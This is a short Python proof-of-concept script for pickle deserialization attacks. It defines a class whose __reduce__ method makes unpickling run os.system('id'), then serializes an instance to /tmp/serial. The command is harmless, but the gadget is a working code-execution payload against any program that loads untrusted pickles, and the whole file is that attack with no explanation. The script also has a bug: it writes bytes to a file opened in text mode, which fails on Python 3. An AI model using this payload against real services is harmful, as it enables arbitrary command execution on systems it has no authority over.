import pickle

class VulnPickle(object):
    def __reduce__(self):
        import os
        return (os.system,("id",))

a = pickle.dumps(VulnPickle())
with open('/tmp/serial', 'w') as f:
    f.write(a)
